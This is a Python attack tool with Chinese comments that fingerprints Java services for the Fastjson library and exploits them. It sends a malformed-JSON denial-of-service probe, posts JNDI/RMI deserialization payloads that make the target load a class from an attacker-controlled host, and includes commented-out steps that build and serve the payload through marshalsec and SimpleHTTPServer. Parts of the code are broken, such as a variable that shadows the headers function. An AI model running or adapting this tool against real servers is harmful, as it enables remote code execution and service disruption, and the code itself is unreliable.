#!/usr/bin/env python
# -*- coding: UTF-8 -*-
'''
@Project ：fastjson_check 
@File ：fastjson_vulns_check.py
@Author ：trance
@Date ：2021/7/2 17:57 

'''
import json, base64, requests, sys
print(sys.path)
from utils.user_agent import UserAgent
from utils.rw_file import RWFile
from fastjson.dis_fastjaon import DisFastjson



def dnslog_fastjson(url):
    """
    dnslog判断是否使用fastjson
    :param url:
    """
    fastjson_result = DisFastjson(url).dnslog_check()
    if fastjson_result:
        print('使用了fastjson')
    else:
        print('未使用了fastjson')


def data_fastjson(url, data):
    """
    确定是java语言、json数据，插入新key，区分jackson和fastjson
    :param url:
    :param data:
    """
    json.dumps(data)
    ch = DisFastjson(url)
    data = ch.data_check(data)
    headers = ch.headers()
    code, header, res_test = ch.request_post(url, headers=headers, data=json.dumps(data))
    print('提示：Jackson因为强制key与javabean属性对齐,只能少不能多key，会报错')
    print('提示：fastjson多key，不会报错')
    print(code, header, res_test)


def dos_fastjson(url):
    """
    探测fastjson版本 大于或小于 1.2.60
    :param url:
    """
    headers = DisFastjson(url).headers()
    data = base64.b64decode('eyJhIjoiXHgaGiJ9')
    code, header, res_test, msecond1 = DisFastjson(url).request_post(url, headers=headers, data=data)
    print('状态码 ', code)
    print('响应头 ', header)
    print('响应数据 ', res_test)
    print('响应时间ms ', msecond1)
    print('----------------------------------------------------')
    print(data, 'Fastjson 版本小于 1.2.60 时，使用该请求包不会延时不会报错\n ')
    data = '{"a":"\\x'
    code, header, res_test, msecond2 = DisFastjson(url).request_post(url, headers=headers, data=data)
    print('状态码 ', code)
    print('响应头 ', header)
    print('响应数据 ', res_test)
    print('响应时间ms ', msecond2)
    print(data, 'Fastjson版本 < 1.2.60 会有ddos漏洞，响应会延时')


def fastjson_exploit(url, ip, lis_port, filename, content_type='application/json', cookie=None):
    pocs = RWFile('texts/fastjson_poc').read()
    http_url = ip + ':' + lis_port + '/' + filename
    # listen(ip, username, passwd, lis_port, http_port, filename)
    # cmd = 'cd marshalsec/ && java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://'+ ip +':'+ http_port +'/#'+ filename +'" '+ lis_port
    # ssh(ip, username, passwd).exec(cmd)

    for key, value in pocs:
        for v in value:
            poc = v.replace('{0}', http_url).replace('\n', '')
            headers = headers(content_type, cookie)
            status_code, header, text = request_post(url, headers, poc)


# def listen(ip, username, passwd, lis_port, http_port, filename):
#     exp = RWFile('../texts/exploit').reads()
#     exp = ''.join(exp)
#     payload = exp.replace('{0}', ip).replace('{1}', lis_port)
#     cmd1 = 'echo -e ' + payload + '>' + filename + '.java'
#     cmd2 = 'javac' + filename + '.java'
#     cmd3 = 'python -m SimpleHTTPServer' + http_port
#     cmds = [cmd1, cmd2, cmd3]
#     for cmd in cmds:
#         ssh(ip, username, passwd).exec(cmd)


def headers(content_type, cookie):
    """
    生成headers
    :param url:
    :param content_type:
    :param cookie:
    :return: obj
    """
    agent = UserAgent(RWFile('texts/user_agent')).random_agent()
    if cookie is None:
        headers = {
            'user-agent': agent,
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Content-Type': content_type
        }
    else:
        headers = {
            'user-agent': agent,
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Content-Type': content_type,
            'Cookie': cookie
        }
    return headers


def request_post(url, headers, data):
    """
    post请求
    :param url:
    :param headers:
    :param data:
    :return:
    """
    res = requests.post(url, headers=headers, data=data, timeout=5)
    return res.status_code, res.headers, res.text


if __name__ == '__main__':
    print('python3 fastjson_vulns_check url 漏洞路径 ip http_ip port rmi_port filename payload文件名称')
    print('python3 fastjson_vulns_check http://ip:8090 11.11.11.11 8888 TouchFile')
    fastjson_exploit(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
